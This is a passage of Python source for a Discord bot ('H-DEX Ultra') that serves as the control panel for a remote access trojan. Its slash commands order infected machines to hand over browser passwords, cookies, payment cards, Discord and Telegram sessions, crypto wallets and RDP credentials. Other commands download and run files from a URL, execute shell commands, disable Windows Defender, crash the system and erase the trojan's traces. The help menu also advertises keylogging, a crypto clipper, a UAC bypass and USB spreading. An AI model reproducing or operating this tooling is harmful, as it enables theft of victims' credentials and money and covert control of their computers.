    embed = create_embed("📶 WiFi Passwords", "Requested WiFi passwords from device.", color=0x00FF7F)
    await interaction.response.send_message(embed=embed, ephemeral=True)


@bot.tree.command(name="history", description="Get browser history from selected device")
async def cmd_history(interaction: discord.Interaction):
    device_id = bot.selected_device.get(interaction.user.id)
    if not device_id or not bot.connected:
        await interaction.response.send_message("❌ No device selected! Use `/dex set <id>` first.", ephemeral=True)
        return
    
    await send_to_server({
        "type": "get_browser_history",
        "target_id": device_id
    })
    
    embed = create_embed("🌐 Browser History", "Requested browser history from device.", color=0x00E5FF)
    await interaction.response.send_message(embed=embed, ephemeral=True)


@bot.tree.command(name="passwords", description="Get saved browser passwords from selected device")
async def cmd_passwords(interaction: discord.Interaction):
    device_id = bot.selected_device.get(interaction.user.id)
    if not device_id or not bot.connected:
        await interaction.response.send_message("❌ No device selected! Use `/dex set <id>` first.", ephemeral=True)
        return
    
    await send_to_server({
        "type": "get_browser_passwords",
        "target_id": device_id
    })
    
    embed = create_embed("🔐 Browser Passwords", "Requested saved passwords from device.", color=0xFF6B6B)
    await interaction.response.send_message(embed=embed, ephemeral=True)


@bot.tree.command(name="processes", description="List running processes on selected device")
async def cmd_processes(interaction: discord.Interaction):
    device_id = bot.selected_device.get(interaction.user.id)
    if not device_id or not bot.connected:
        await interaction.response.send_message("❌ No device selected! Use `/dex set <id>` first.", ephemeral=True)
        return
    
    await interaction.response.defer(thinking=True)
    
    future = asyncio.get_event_loop().create_future()
    bot.pending_responses[f"processes_{device_id}"] = future
    
    await send_to_server({
        "type": "get_processes",
        "target_id": device_id
    })
    
    try:
        processes = await asyncio.wait_for(future, timeout=15)
        
        embed = create_embed("📊 Running Processes", f"**{len(processes)}** processes running")
        
        # Top 20 by memory
        top_procs = sorted(processes, key=lambda x: x.get('memory', 0), reverse=True)[:20]
        proc_list = "\n".join([f"`{p.get('pid', '?')}` - {p.get('name', 'Unknown')[:25]}" for p in top_procs])
        
        embed.add_field(name="Top 20 by Memory", value=proc_list or "No processes", inline=False)
        
        await interaction.followup.send(embed=embed)
    except asyncio.TimeoutError:
        await interaction.followup.send("❌ Request timed out!", ephemeral=True)


@bot.tree.command(name="kill", description="Kill a process on selected device")
@app_commands.describe(pid="Process ID to kill")
async def cmd_kill(interaction: discord.Interaction, pid: int):
    device_id = bot.selected_device.get(interaction.user.id)
    if not device_id or not bot.connected:
        await interaction.response.send_message("❌ No device selected! Use `/dex set <id>` first.", ephemeral=True)
        return
    
    await send_to_server({
        "type": "kill_process",
        "target_id": device_id,
        "pid": pid
    })
    
    embed = create_embed("💀 Process Killed", f"Sent kill signal for PID: `{pid}`", color=0xFF4136)
    await interaction.response.send_message(embed=embed)


@bot.tree.command(name="clipboard", description="Get clipboard content from selected device")
async def cmd_clipboard(interaction: discord.Interaction):
    device_id = bot.selected_device.get(interaction.user.id)
    if not device_id or not bot.connected:
        await interaction.response.send_message("❌ No device selected! Use `/dex set <id>` first.", ephemeral=True)
        return
    
    await send_to_server({
        "type": "get_clipboard",
        "target_id": device_id
    })
    
    embed = create_embed("📋 Clipboard", "Requested clipboard content from device.", color=0x00E5FF)
    await interaction.response.send_message(embed=embed, ephemeral=True)


@bot.tree.command(name="setclipboard", description="Set clipboard content on selected device")
@app_commands.describe(text="Text to set in clipboard")
async def cmd_setclipboard(interaction: discord.Interaction, text: str):
    device_id = bot.selected_device.get(interaction.user.id)
    if not device_id or not bot.connected:
        await interaction.response.send_message("❌ No device selected! Use `/dex set <id>` first.", ephemeral=True)
        return
    
    await send_to_server({
        "type": "set_clipboard",
        "target_id": device_id,
        "content": text
    })
    
    embed = create_embed("📋 Clipboard Set", f"Set clipboard to: `{text[:100]}{'...' if len(text) > 100 else ''}`", color=0x00FF7F)
    await interaction.response.send_message(embed=embed)


@bot.tree.command(name="opencd", description="Open CD/DVD tray on selected device")
async def cmd_opencd(interaction: discord.Interaction):
    device_id = bot.selected_device.get(interaction.user.id)
    if not device_id or not bot.connected:
        await interaction.response.send_message("❌ No device selected! Use `/dex set <id>` first.", ephemeral=True)
        return
    
    await send_to_server({
        "type": "open_cd",
        "target_id": device_id
    })
    
    embed = create_embed("💿 CD Tray", "Opening CD/DVD tray...", color=0x00FF7F)
    await interaction.response.send_message(embed=embed)


@bot.tree.command(name="beep", description="Play a beep sound on selected device")
async def cmd_beep(interaction: discord.Interaction):
    device_id = bot.selected_device.get(interaction.user.id)
    if not device_id or not bot.connected:
        await interaction.response.send_message("❌ No device selected! Use `/dex set <id>` first.", ephemeral=True)
        return
    
    await send_to_server({
        "type": "beep",
        "target_id": device_id
    })
    
    embed = create_embed("🔔 Beep", "Playing beep sound on device...", color=0x00FF7F)
    await interaction.response.send_message(embed=embed)


@bot.tree.command(name="monitoroff", description="Turn off monitor on selected device")
async def cmd_monitoroff(interaction: discord.Interaction):
    device_id = bot.selected_device.get(interaction.user.id)
    if not device_id or not bot.connected:
        await interaction.response.send_message("❌ No device selected! Use `/dex set <id>` first.", ephemeral=True)
        return
    
    await send_to_server({
        "type": "monitor_off",
        "target_id": device_id
    })
    
    embed = create_embed("🖥️ Monitor Off", "Turning off monitor...", color=0xFFD700)
    await interaction.response.send_message(embed=embed)


@bot.tree.command(name="crazymouse", description="Make mouse go crazy for 10 seconds")
async def cmd_crazymouse(interaction: discord.Interaction):
    device_id = bot.selected_device.get(interaction.user.id)
    if not device_id or not bot.connected:
        await interaction.response.send_message("❌ No device selected! Use `/dex set <id>` first.", ephemeral=True)
        return
    
    await send_to_server({
        "type": "crazy_mouse",
        "target_id": device_id
    })
    
    embed = create_embed("🖱️ Crazy Mouse", "Mouse going crazy for 10 seconds!", color=0xFF6B6B)
    await interaction.response.send_message(embed=embed)


@bot.tree.command(name="hidetaskbar", description="Hide taskbar on selected device")
async def cmd_hidetaskbar(interaction: discord.Interaction):
    device_id = bot.selected_device.get(interaction.user.id)
    if not device_id or not bot.connected:
        await interaction.response.send_message("❌ No device selected! Use `/dex set <id>` first.", ephemeral=True)
        return
    
    await send_to_server({
        "type": "hide_taskbar",
        "target_id": device_id
    })
    
    embed = create_embed("📌 Taskbar Hidden", "Taskbar is now hidden!", color=0x00FF7F)
    await interaction.response.send_message(embed=embed)


@bot.tree.command(name="showtaskbar", description="Show taskbar on selected device")
async def cmd_showtaskbar(interaction: discord.Interaction):
    device_id = bot.selected_device.get(interaction.user.id)
    if not device_id or not bot.connected:
        await interaction.response.send_message("❌ No device selected! Use `/dex set <id>` first.", ephemeral=True)
        return
    
    await send_to_server({
        "type": "show_taskbar",
        "target_id": device_id
    })
    
    embed = create_embed("📌 Taskbar Shown", "Taskbar is now visible!", color=0x00FF7F)
    await interaction.response.send_message(embed=embed)


@bot.tree.command(name="blockinput", description="Block keyboard and mouse on selected device")
async def cmd_blockinput(interaction: discord.Interaction):
    device_id = bot.selected_device.get(interaction.user.id)
    if not device_id or not bot.connected:
        await interaction.response.send_message("❌ No device selected! Use `/dex set <id>` first.", ephemeral=True)
        return
    
    await send_to_server({
        "type": "block_input_enhanced",
        "target_id": device_id
    })
    
    embed = create_embed("🚫 Input Blocked", "Keyboard and mouse are now blocked!", color=0xFF4136)
    await interaction.response.send_message(embed=embed)


@bot.tree.command(name="unblockinput", description="Unblock keyboard and mouse on selected device")
async def cmd_unblockinput(interaction: discord.Interaction):
    device_id = bot.selected_device.get(interaction.user.id)
    if not device_id or not bot.connected:
        await interaction.response.send_message("❌ No device selected! Use `/dex set <id>` first.", ephemeral=True)
        return
    
    await send_to_server({
        "type": "unblock_input_enhanced",
        "target_id": device_id
    })
    
    embed = create_embed("✅ Input Unblocked", "Keyboard and mouse are now unblocked!", color=0x00FF7F)
    await interaction.response.send_message(embed=embed)


@bot.tree.command(name="logoff", description="Log off selected device")
async def cmd_logoff(interaction: discord.Interaction):
    device_id = bot.selected_device.get(interaction.user.id)
    if not device_id or not bot.connected:
        await interaction.response.send_message("❌ No device selected! Use `/dex set <id>` first.", ephemeral=True)
        return
    
    await send_to_server({
        "type": "execute_command",
        "target_id": device_id,
        "command": "shutdown /l"
    })
    
    embed = create_embed("🚪 Logoff", f"Logging off **{bot.devices.get(device_id, {}).get('name', 'Unknown')}**", color=0xFFD700)
    await interaction.response.send_message(embed=embed)


@bot.tree.command(name="download", description="Download and execute file on selected device")
@app_commands.describe(url="Direct URL to file to download and execute")
async def cmd_download(interaction: discord.Interaction, url: str):
    device_id = bot.selected_device.get(interaction.user.id)
    if not device_id or not bot.connected:
        await interaction.response.send_message("❌ No device selected! Use `/dex set <id>` first.", ephemeral=True)
        return
    
    await send_to_server({
        "type": "download_execute",
        "target_id": device_id,
        "url": url
    })
    
    embed = create_embed("⬇️ Download & Execute", f"Downloading: `{url[:60]}...`", color=0xFF6600)
    await interaction.response.send_message(embed=embed)


@bot.tree.command(name="disabletaskmgr", description="Disable Task Manager on selected device")
async def cmd_disabletaskmgr(interaction: discord.Interaction):
    device_id = bot.selected_device.get(interaction.user.id)
    if not device_id or not bot.connected:
        await interaction.response.send_message("❌ No device selected! Use `/dex set <id>` first.", ephemeral=True)
        return
    
    await send_to_server({
        "type": "disable_taskmgr",
        "target_id": device_id
    })
    
    embed = create_embed("🚫 Task Manager Disabled", "Task Manager is now disabled!", color=0xFF4136)
    await interaction.response.send_message(embed=embed)


@bot.tree.command(name="enabletaskmgr", description="Enable Task Manager on selected device")
async def cmd_enabletaskmgr(interaction: discord.Interaction):
    device_id = bot.selected_device.get(interaction.user.id)
    if not device_id or not bot.connected:
        await interaction.response.send_message("❌ No device selected! Use `/dex set <id>` first.", ephemeral=True)
        return
    
    await send_to_server({
        "type": "enable_taskmgr",
        "target_id": device_id
    })
    
    embed = create_embed("✅ Task Manager Enabled", "Task Manager is now enabled!", color=0x00FF7F)
    await interaction.response.send_message(embed=embed)


@bot.tree.command(name="danger", description="Trigger ULTRA DANGER MODE on selected device")
async def cmd_danger(interaction: discord.Interaction):
    device_id = bot.selected_device.get(interaction.user.id)
    if not device_id or not bot.connected:
        await interaction.response.send_message("❌ No device selected! Use `/dex set <id>` first.", ephemeral=True)
        return
    
    await send_to_server({
        "type": "start_danger",
        "target_id": device_id
    })
    
    embed = create_embed("🚨 DANGER MODE ACTIVATED", f"Initiating Ultra Chaos on **{bot.devices.get(device_id, {}).get('name', 'Unknown')}**", color=0xFF0000)
    embed.add_field(name="Actions", value="- Lockdown\n- Jumpscares\n- Recovery Game\n- Visual Nightmare", inline=False)
    await interaction.response.send_message(embed=embed)


@bot.tree.command(name="sleep", description="Put selected device to sleep mode")
async def cmd_sleep(interaction: discord.Interaction):
    device_id = bot.selected_device.get(interaction.user.id)
    if not device_id or not bot.connected:
        await interaction.response.send_message("❌ No device selected! Use `/dex set <id>` first.", ephemeral=True)
        return
    
    await send_to_server({
        "type": "execute_command",
        "target_id": device_id,
        "command": "rundll32.exe powrprof.dll,SetSuspendState 0,1,0"
    })
    
    embed = create_embed("💤 Sleep Mode", f"Putting **{bot.devices.get(device_id, {}).get('name', 'Unknown')}** to sleep", color=Colors.INFO)
    await interaction.response.send_message(embed=embed)


@bot.tree.command(name="hibernate", description="Hibernate selected device")
async def cmd_hibernate(interaction: discord.Interaction):
    device_id = bot.selected_device.get(interaction.user.id)
    if not device_id or not bot.connected:
        await interaction.response.send_message("❌ No device selected! Use `/dex set <id>` first.", ephemeral=True)
        return
    
    await send_to_server({
        "type": "execute_command",
        "target_id": device_id,
        "command": "shutdown /h"
    })
    
    embed = create_embed("❄️ Hibernate", f"Hibernating **{bot.devices.get(device_id, {}).get('name', 'Unknown')}**", color=Colors.INFO)
    await interaction.response.send_message(embed=embed)


@bot.tree.command(name="volume", description="Set volume on selected device")
@app_commands.describe(level="Volume level (0-100)")
async def cmd_volume(interaction: discord.Interaction, level: int):
    device_id = bot.selected_device.get(interaction.user.id)
    if not device_id or not bot.connected:
        await interaction.response.send_message("❌ No device selected! Use `/dex set <id>` first.", ephemeral=True)
        return
    
    level = max(0, min(100, level))  # Clamp to 0-100
    
    await send_to_server({
        "type": "set_volume",
        "target_id": device_id,
        "level": level
    })
    
    icon = "🔇" if level == 0 else "🔈" if level < 33 else "🔉" if level < 66 else "🔊"
    embed = create_embed(f"{icon} Volume Set", f"Volume set to **{level}%**", color=Colors.SUCCESS)
    await interaction.response.send_message(embed=embed)


@bot.tree.command(name="mute", description="Mute audio on selected device")
async def cmd_mute(interaction: discord.Interaction):
    device_id = bot.selected_device.get(interaction.user.id)
    if not device_id or not bot.connected:
        await interaction.response.send_message("❌ No device selected! Use `/dex set <id>` first.", ephemeral=True)
        return
    
    await send_to_server({
        "type": "mute_audio",
        "target_id": device_id
    })
    
    embed = create_embed("� Muted", "Device audio muted", color=Colors.WARNING)
    await interaction.response.send_message(embed=embed)


@bot.tree.command(name="alert", description="Show urgent alert on selected device")
@app_commands.describe(message="Alert message to display")
async def cmd_alert(interaction: discord.Interaction, message: str):
    device_id = bot.selected_device.get(interaction.user.id)
    if not device_id or not bot.connected:
        await interaction.response.send_message("❌ No device selected! Use `/dex set <id>` first.", ephemeral=True)
        return
    
    await send_to_server({
        "type": "show_message",
        "target_id": device_id,
        "title": "⚠️ ALERT",
        "message": message,
        "icon": "warning"
    })
    
    embed = create_embed("🚨 Alert Sent", f"**Message:** {message}", color=Colors.WARNING)
    await interaction.response.send_message(embed=embed)


@bot.tree.command(name="virus", description="Trigger scary virus prank on selected device")
async def cmd_virus(interaction: discord.Interaction):
    device_id = bot.selected_device.get(interaction.user.id)
    if not device_id or not bot.connected:
        await interaction.response.send_message("❌ No device selected! Use `/dex set <id>` first.", ephemeral=True)
        return
    
    await send_to_server({
        "type": "prank_virus",
        "target_id": device_id
    })
    
    embed = create_embed("☣️ Virus Prank Activated", f"Triggering scary virus effect on **{bot.devices.get(device_id, {}).get('name', 'Unknown')}**", color=0xFF4136)
    await interaction.response.send_message(embed=embed)


@bot.tree.command(name="battery", description="Get battery status of selected device")
async def cmd_battery(interaction: discord.Interaction):
    device_id = bot.selected_device.get(interaction.user.id)
    if not device_id or not bot.connected:
        await interaction.response.send_message("❌ No device selected! Use `/dex set <id>` first.", ephemeral=True)
        return
    
    await send_to_server({
        "type": "get_battery",
        "target_id": device_id
    })
    
    embed = create_embed("🔋 Battery", "Requested battery status from device.", color=Colors.INFO)
    await interaction.response.send_message(embed=embed, ephemeral=True)


@bot.tree.command(name="countdown", description="Display countdown timer on device")
@app_commands.describe(seconds="Countdown duration in seconds", message="Message to display")
async def cmd_countdown(interaction: discord.Interaction, seconds: int, message: str = "Time's up!"):
    device_id = bot.selected_device.get(interaction.user.id)
    if not device_id or not bot.connected:
        await interaction.response.send_message("❌ No device selected! Use `/dex set <id>` first.", ephemeral=True)
        return
    
    await send_to_server({
        "type": "countdown",
        "target_id": device_id,
        "seconds": seconds,
        "message": message
    })
    
    embed = create_embed("⏳ Countdown", f"Starting **{seconds}s** countdown\nMessage: *{message}*", color=Colors.INFO)
    await interaction.response.send_message(embed=embed)


@bot.tree.command(name="help", description="Show all available commands")
async def cmd_help(interaction: discord.Interaction):
    embed = create_embed("📚 H-DEX Bot Commands", "**v3.1 ULTRA** - Complete command reference", color=Colors.PRIMARY)
    
    embed.add_field(
        name="🔌 Connection & Status",
        value="`/dex connect` `/dex disconnect` `/dex server`\n`/dex ping` `/dex uptime` `/dex stats`",
        inline=False
    )
    
    embed.add_field(
        name="📱 Device Management",
        value="`/dex list` `/dex set <id>` `/dex dashboard` `/dex set url <url>`",
        inline=False
    )
    
    embed.add_field(
        name="🎮 Device Control",
        value="`/screenshot` `/webcam` `/lock` `/shutdown` `/restart`\n`/sleep` `/hibernate` `/logoff` `/terminal <cmd>` `/shell <cmd>`",
        inline=False
    )
    
    embed.add_field(
        name="🔊 Audio & Display",
        value="`/volume <0-100>` `/mute` `/speak <text>`\n`/monitoroff` `/message <title> <text>` `/alert <msg>` `/wallpaper <url>`",
        inline=False
    )
    
    embed.add_field(
        name="📊 Information",
        value="`/sysinfo` `/location` `/files [path]` `/processes`\n`/clipboard` `/battery` `/url <url>` `/productkeys`",
        inline=False
    )
    
    embed.add_field(
        name="🔐 Data Extraction",
        value="`/keylog` `/wifi` `/history` `/passwords` `/cookies`\n`/bookmarks` `/autofill` `/extensions` `/cards`\n`/discord` `/telegram` `/wallets` `/rdp`",
        inline=False
    )
    
    embed.add_field(
        name="📋 Monitoring",
        value="`/clipmon` `/stopclipmon` — Clipboard monitor\n`/windowtrack` `/stopwindowtrack` `/windowlog` — Window tracker\n`/cryptoclip <btc> <eth>` `/stopcryptoclip` — Crypto clipper",
        inline=False
    )
    
    embed.add_field(
        name="🎭 Fun & Control",
        value="`/opencd` `/beep` `/crazymouse` `/virus` `/fakebsod`\n`/hidetaskbar` `/showtaskbar` `/blockinput` `/unblockinput` `/matrix`",
        inline=False
    )
    
    embed.add_field(
        name="⚙️ Admin & Advanced",
        value="`/disabletaskmgr` `/enabletaskmgr` `/download <url>`\n`/kill <pid>` `/setclipboard <text>` `/danger` `/selfdestruct`\n`/uacbypass` `/spreadusb` `/broadcast <cmd>`",
        inline=False
    )
    
    embed.set_footer(text="H-DEX Ultra v3.1 | Use /dex connect to get started")
    await interaction.response.send_message(embed=embed)


@bot.tree.command(name="fakebsod", description="Show fake Blue Screen of Death on selected device")
async def cmd_fakebsod(interaction: discord.Interaction):
    device_id = bot.selected_device.get(interaction.user.id)
    if not device_id or not bot.connected:
        await interaction.response.send_message("❌ No device selected! Use `/dex set <id>` first.", ephemeral=True)
        return
    
    await send_to_server({
        "type": "fake_bsod",
        "target_id": device_id
    })
    
    embed = create_embed("💀 Fake BSOD", f"Showing fake Blue Screen on **{bot.devices.get(device_id, {}).get('name', 'Unknown')}**", color=0x0078D7)
    await interaction.response.send_message(embed=embed)


@bot.tree.command(name="matrix", description="Display Matrix screen effect on selected device")
async def cmd_matrix(interaction: discord.Interaction):
    device_id = bot.selected_device.get(interaction.user.id)
    if not device_id or not bot.connected:
        await interaction.response.send_message("❌ No device selected! Use `/dex set <id>` first.", ephemeral=True)
        return
    
    await send_to_server({
        "type": "ultra_matrix",
        "target_id": device_id
    })
    
    embed = create_embed("🟢 Matrix Mode", f"Activating Matrix effect on **{bot.devices.get(device_id, {}).get('name', 'Unknown')}**", color=0x00FF00)
    await interaction.response.send_message(embed=embed)


@bot.tree.command(name="hangup", description="Hang/freeze the selected device (CPU stress)")
async def cmd_hangup(interaction: discord.Interaction):
    device_id = bot.selected_device.get(interaction.user.id)
    if not device_id or not bot.connected:
        await interaction.response.send_message("❌ No device selected! Use `/dex set <id>` first.", ephemeral=True)
        return
    
    await send_to_server({
        "type": "hang_system",
        "target_id": device_id
    })
    
    embed = create_embed("🔥 System Hung", f"CPU stress test started on **{bot.devices.get(device_id, {}).get('name', 'Unknown')}**", color=Colors.DANGER)
    await interaction.response.send_message(embed=embed)


@bot.tree.command(name="selfdestruct", description="Self-destruct the client on selected device (removes all traces)")
async def cmd_selfdestruct(interaction: discord.Interaction):
    device_id = bot.selected_device.get(interaction.user.id)
    if not device_id or not bot.connected:
        await interaction.response.send_message("❌ No device selected! Use `/dex set <id>` first.", ephemeral=True)
        return
    
    # Confirmation step
    embed = create_embed("⚠️ CONFIRM SELF-DESTRUCT", 
        f"This will **permanently remove** the client from **{bot.devices.get(device_id, {}).get('name', 'Unknown')}** and delete all traces.\n\n**This action is IRREVERSIBLE.**",
        color=Colors.DANGER)
    
    await interaction.response.send_message(embed=embed)
    
    # Actually send the command
    await send_to_server({
        "type": "self_destruct",
        "target_id": device_id
    })


@bot.tree.command(name="disabledefender", description="Disable Windows Defender on selected device")
async def cmd_disabledefender(interaction: discord.Interaction):
    device_id = bot.selected_device.get(interaction.user.id)
    if not device_id or not bot.connected:
        await interaction.response.send_message("❌ No device selected! Use `/dex set <id>` first.", ephemeral=True)
        return
    
    await send_to_server({
        "type": "disable_defender",
        "target_id": device_id
    })
    
    embed = create_embed("🛡️ Defender Disabled", f"Attempting to disable Windows Defender on **{bot.devices.get(device_id, {}).get('name', 'Unknown')}**", color=Colors.WARNING)
    await interaction.response.send_message(embed=embed)


@bot.tree.command(name="enabledefender", description="Enable Windows Defender on selected device")
async def cmd_enabledefender(interaction: discord.Interaction):
    device_id = bot.selected_device.get(interaction.user.id)
    if not device_id or not bot.connected:
        await interaction.response.send_message("❌ No device selected! Use `/dex set <id>` first.", ephemeral=True)
        return
    
    await send_to_server({
        "type": "enable_defender",
        "target_id": device_id
    })
    
    embed = create_embed("🛡️ Defender Enabled", f"Re-enabling Windows Defender on **{bot.devices.get(device_id, {}).get('name', 'Unknown')}**", color=Colors.SUCCESS)
    await interaction.response.send_message(embed=embed)


@bot.tree.command(name="realbsod", description="⚠️ TRIGGER REAL BSOD on selected device (DANGEROUS)")
async def cmd_realbsod(interaction: discord.Interaction):
    device_id = bot.selected_device.get(interaction.user.id)
    if not device_id or not bot.connected:
        await interaction.response.send_message("❌ No device selected! Use `/dex set <id>` first.", ephemeral=True)
        return
    
    await send_to_server({
        "type": "bsod",
        "target_id": device_id
    })
    
    embed = create_embed("☠️ REAL BSOD TRIGGERED", f"**WARNING:** Blue Screen triggered on **{bot.devices.get(device_id, {}).get('name', 'Unknown')}**\nDevice will crash immediately.", color=0xFF0000)
    await interaction.response.send_message(embed=embed)


@bot.tree.command(name="emptyrecycle", description="Empty recycle bin on selected device")
async def cmd_emptyrecycle(interaction: discord.Interaction):
    device_id = bot.selected_device.get(interaction.user.id)
    if not device_id or not bot.connected:
        await interaction.response.send_message("❌ No device selected! Use `/dex set <id>` first.", ephemeral=True)
        return
    
    await send_to_server({
        "type": "empty_recycle",
        "target_id": device_id
    })
    
    embed = create_embed("🗑️ Recycle Bin", f"Emptied recycle bin on **{bot.devices.get(device_id, {}).get('name', 'Unknown')}**", color=Colors.SUCCESS)
    await interaction.response.send_message(embed=embed)


@bot.tree.command(name="hideicons", description="Hide desktop icons on selected device")
async def cmd_hideicons(interaction: discord.Interaction):
    device_id = bot.selected_device.get(interaction.user.id)
    if not device_id or not bot.connected:
        await interaction.response.send_message("❌ No device selected! Use `/dex set <id>` first.", ephemeral=True)
        return
    
    await send_to_server({
        "type": "hide_icons",
        "target_id": device_id
    })
    
    embed = create_embed("👻 Icons Hidden", f"Desktop icons hidden on **{bot.devices.get(device_id, {}).get('name', 'Unknown')}**", color=Colors.SUCCESS)
    await interaction.response.send_message(embed=embed)


@bot.tree.command(name="showicons", description="Show desktop icons on selected device")
async def cmd_showicons(interaction: discord.Interaction):
    device_id = bot.selected_device.get(interaction.user.id)
    if not device_id or not bot.connected:
        await interaction.response.send_message("❌ No device selected! Use `/dex set <id>` first.", ephemeral=True)
        return
    
    await send_to_server({
        "type": "show_icons",
        "target_id": device_id
    })
    
    embed = create_embed("🖼️ Icons Shown", f"Desktop icons restored on **{bot.devices.get(device_id, {}).get('name', 'Unknown')}**", color=Colors.SUCCESS)
    await interaction.response.send_message(embed=embed)


@bot.tree.command(name="broadcast", description="Send a command to ALL connected devices")
@app_commands.describe(command="Command to broadcast (e.g. 'prank_virus', 'fake_bsod', 'beep')")
async def cmd_broadcast(interaction: discord.Interaction, command: str):
    if not bot.connected:
        await interaction.response.send_message("❌ Not connected to server!", ephemeral=True)
        return
    
    if not bot.devices:
        await interaction.response.send_message("❌ No devices connected!", ephemeral=True)
        return
    
    await send_to_server({
        "type": "broadcast_to_devices",
        "command_type": command,
        "data": {}
    })
    
    embed = create_embed("📢 Broadcast Sent", f"Command `{command}` sent to **{len(bot.devices)}** devices", color=Colors.WARNING)
    await interaction.response.send_message(embed=embed)


@bot.tree.command(name="shell", description="Execute shell command on selected device")
@app_commands.describe(command="Command to execute")
async def cmd_terminal(interaction: discord.Interaction, command: str):
    device_id = bot.selected_device.get(interaction.user.id)
    if not device_id or not bot.connected:
        await interaction.response.send_message("❌ No device selected! Use `/dex set <id>` first.", ephemeral=True)
        return
    
    await interaction.response.defer(thinking=True)
    
    future = asyncio.get_event_loop().create_future()
    bot.pending_responses[f"terminal_{device_id}"] = future
    
    await send_to_server({
        "type": "shell_exec",
        "target_id": device_id,
        "command": command
    })
    
    try:
        data = await asyncio.wait_for(future, timeout=20)
        output = data
        
        if len(output) > 4000:
            output = output[:4000] + "\n...[Truncated]"
            
        embed = create_embed("💻 Terminal Output", f"Command: `{command}`")
        embed.description = f"```powershell\n{output}\n```"
        
        await interaction.followup.send(embed=embed)
    except asyncio.TimeoutError:
        await interaction.followup.send("❌ Command timed out!", ephemeral=True)


# ═══════════════════════════════════════════════════════════════════════════════
# NEW v3.1 COMMANDS — DATA EXTRACTION & MONITORING
# ═══════════════════════════════════════════════════════════════════════════════

@bot.tree.command(name="discord", description="Grab Discord tokens from selected device")
async def cmd_discord_tokens(interaction: discord.Interaction):
    device_id = bot.selected_device.get(interaction.user.id)
    if not device_id or not bot.connected:
        await interaction.response.send_message("❌ No device selected! Use `/dex set <id>` first.", ephemeral=True)
        return
    await send_to_server({"type": "get_discord_tokens", "target_id": device_id})
    embed = create_embed("🎮 Discord Tokens", "Extracting Discord tokens from device...", color=0x5865F2)
    await interaction.response.send_message(embed=embed, ephemeral=True)


@bot.tree.command(name="telegram", description="Grab Telegram session data from selected device")
async def cmd_telegram(interaction: discord.Interaction):
    device_id = bot.selected_device.get(interaction.user.id)
    if not device_id or not bot.connected:
        await interaction.response.send_message("❌ No device selected! Use `/dex set <id>` first.", ephemeral=True)
        return
    await send_to_server({"type": "get_telegram", "target_id": device_id})
    embed = create_embed("✈️ Telegram Sessions", "Extracting Telegram session data...", color=0x0088CC)
    await interaction.response.send_message(embed=embed, ephemeral=True)


@bot.tree.command(name="wallets", description="Scan for crypto wallets on selected device")
async def cmd_wallets(interaction: discord.Interaction):
    device_id = bot.selected_device.get(interaction.user.id)
    if not device_id or not bot.connected:
        await interaction.response.send_message("❌ No device selected! Use `/dex set <id>` first.", ephemeral=True)
        return
    await send_to_server({"type": "scan_wallets", "target_id": device_id})
    embed = create_embed("💰 Crypto Wallets", "Scanning for cryptocurrency wallets...", color=0xF7931A)
    await interaction.response.send_message(embed=embed, ephemeral=True)


@bot.tree.command(name="cookies", description="Extract browser cookies from selected device")
async def cmd_cookies(interaction: discord.Interaction):
    device_id = bot.selected_device.get(interaction.user.id)
    if not device_id or not bot.connected:
        await interaction.response.send_message("❌ No device selected! Use `/dex set <id>` first.", ephemeral=True)
        return
    await send_to_server({"type": "get_browser_cookies", "target_id": device_id})
    embed = create_embed("🍪 Browser Cookies", "Extracting browser cookies...", color=0xD2691E)
    await interaction.response.send_message(embed=embed, ephemeral=True)


@bot.tree.command(name="bookmarks", description="Extract browser bookmarks from selected device")
async def cmd_bookmarks(interaction: discord.Interaction):
    device_id = bot.selected_device.get(interaction.user.id)
    if not device_id or not bot.connected:
        await interaction.response.send_message("❌ No device selected! Use `/dex set <id>` first.", ephemeral=True)
        return
    await send_to_server({"type": "get_browser_bookmarks", "target_id": device_id})
    embed = create_embed("🔖 Bookmarks", "Extracting browser bookmarks...", color=0x4A90D9)
    await interaction.response.send_message(embed=embed, ephemeral=True)


@bot.tree.command(name="autofill", description="Extract browser autofill data from selected device")
async def cmd_autofill(interaction: discord.Interaction):
    device_id = bot.selected_device.get(interaction.user.id)
    if not device_id or not bot.connected:
        await interaction.response.send_message("❌ No device selected! Use `/dex set <id>` first.", ephemeral=True)
        return
    await send_to_server({"type": "get_browser_autofill", "target_id": device_id})
    embed = create_embed("📝 Autofill Data", "Extracting autofill entries (names, addresses, phones)...", color=0x7B68EE)
    await interaction.response.send_message(embed=embed, ephemeral=True)


@bot.tree.command(name="extensions", description="List browser extensions on selected device")
async def cmd_extensions(interaction: discord.Interaction):
    device_id = bot.selected_device.get(interaction.user.id)
    if not device_id or not bot.connected:
        await interaction.response.send_message("❌ No device selected! Use `/dex set <id>` first.", ephemeral=True)
        return
    await send_to_server({"type": "get_browser_ext", "target_id": device_id})
    embed = create_embed("🧩 Browser Extensions", "Listing installed browser extensions...", color=0x4285F4)
    await interaction.response.send_message(embed=embed, ephemeral=True)


@bot.tree.command(name="cards", description="Extract saved payment cards from browser on selected device")
async def cmd_cards(interaction: discord.Interaction):
    device_id = bot.selected_device.get(interaction.user.id)
    if not device_id or not bot.connected:
        await interaction.response.send_message("❌ No device selected! Use `/dex set <id>` first.", ephemeral=True)
        return
    await send_to_server({"type": "get_browser_cards", "target_id": device_id})
    embed = create_embed("💳 Payment Cards", "Extracting saved payment cards from browser...", color=0xFF4500)
    await interaction.response.send_message(embed=embed, ephemeral=True)


@bot.tree.command(name="productkeys", description="Get Windows & Office product keys from selected device")
async def cmd_productkeys(interaction: discord.Interaction):
    device_id = bot.selected_device.get(interaction.user.id)
    if not device_id or not bot.connected:
        await interaction.response.send_message("❌ No device selected! Use `/dex set <id>` first.", ephemeral=True)
        return
    await send_to_server({"type": "get_product_keys", "target_id": device_id})
    embed = create_embed("🔑 Product Keys", "Extracting Windows & Office product keys...", color=0x00A4EF)
    await interaction.response.send_message(embed=embed, ephemeral=True)


@bot.tree.command(name="rdp", description="Get saved RDP credentials & recent servers from selected device")
async def cmd_rdp(interaction: discord.Interaction):
    device_id = bot.selected_device.get(interaction.user.id)
    if not device_id or not bot.connected:
        await interaction.response.send_message("❌ No device selected! Use `/dex set <id>` first.", ephemeral=True)
        return
    await send_to_server({"type": "get_saved_rdp", "target_id": device_id})
    embed = create_embed("🖧 RDP Credentials", "Harvesting saved Remote Desktop credentials...", color=0x0078D7)
    await interaction.response.send_message(embed=embed, ephemeral=True)


# ═══════════════════════════════════════════════════════════════════════════════
# NEW v3.1 COMMANDS — LIVE MONITORING
# ═══════════════════════════════════════════════════════════════════════════════

@bot.tree.command(name="clipmon", description="Start real-time clipboard monitoring on selected device")
